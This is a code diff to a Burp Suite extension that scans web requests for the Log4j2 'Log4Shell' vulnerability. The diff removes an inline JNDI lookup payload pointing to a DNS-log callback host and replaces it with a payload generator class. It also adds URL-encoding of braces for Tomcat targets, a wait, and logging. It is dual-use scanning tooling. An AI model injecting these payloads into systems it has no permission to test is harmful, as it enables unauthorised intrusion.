@@ -4,6 +4,8 @@ import burp.*;
 import burp.dnslog.IDnslog;
 import burp.dnslog.platform.Ceye;
 import burp.dnslog.platform.DnslogCN;
+import burp.poc.IPOC;
+import burp.poc.impl.POC2;
 import burp.utils.ScanItem;
 import burp.utils.Utils;
 
@@ -16,11 +18,13 @@ public class Log4j2Scanner implements IScannerCheck {
     private BurpExtender parent;
     private IExtensionHelpers helper;
     private IDnslog dnslog;
+    private IPOC poc;
 
 
     public Log4j2Scanner(final BurpExtender newParent) {
         this.parent = newParent;
         this.helper = newParent.helpers;
+        this.poc = new POC2();
         this.dnslog = new DnslogCN();
         if (this.dnslog.getState()) {
             parent.stdout.println("Log4j2Scan loaded successfully!\r\n");
@@ -29,24 +33,32 @@ public class Log4j2Scanner implements IScannerCheck {
         }
     }
 
+    public String urlencodeForTomcat(String exp) {
+        exp = exp.replace("{", "%7b");
+        exp = exp.replace("}", "%7d");
+        return exp;
+    }
+
     @Override
     public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {
         IRequestInfo req = this.parent.helpers.analyzeRequest(baseRequestResponse);
         List<IScanIssue> issues = new ArrayList<>();
         Map<String, ScanItem> domainMap = new HashMap<>();
         byte[] rawRequest = baseRequestResponse.getRequest();
+        parent.stdout.println(String.format("Scanning: %s", req.getUrl()));
         for (IParameter param :
                 req.getParameters()) {
             try {
                 String tmpDomain = dnslog.getNewDomain();
                 byte[] tmpRawRequest = rawRequest;
-                String exp = "${jndi:ldap://" + tmpDomain + "/" + Utils.GetRandomNumber(100000, 999999) + "}";
+                String exp = poc.generate(tmpDomain);
                 boolean hasModify = false;
                 switch (param.getType()) {
                     case IParameter.PARAM_URL:
                     case IParameter.PARAM_BODY:
                     case IParameter.PARAM_COOKIE:
                         exp = helper.urlEncode(exp);
+                        exp = urlencodeForTomcat(exp);
                         IParameter newParam = parent.helpers.buildParameter(param.getName(), exp, param.getType());
                         tmpRawRequest = parent.helpers.updateParameter(rawRequest, newParam);
                         hasModify = true;
@@ -64,8 +76,13 @@ public class Log4j2Scanner implements IScannerCheck {
 
                 }
             } catch (Exception ex) {
-                System.out.println(ex);
+                parent.stdout.println(ex);
             }
+        }
+        try {
+            Thread.sleep(2000); //sleep 2s, wait for network delay.
+        } catch (InterruptedException e) {
+            parent.stdout.println(e);
         }
         if (dnslog.flushCache()) {
             for (Map.Entry<String, ScanItem> domainItem :
@@ -84,6 +101,7 @@ public class Log4j2Scanner implements IScannerCheck {
         } else {
             parent.stdout.println("get dnslog result failed!\r\n");
         }
+        parent.stdout.println(String.format("Scan complete: %s", req.getUrl()));
         return issues;
     }
 
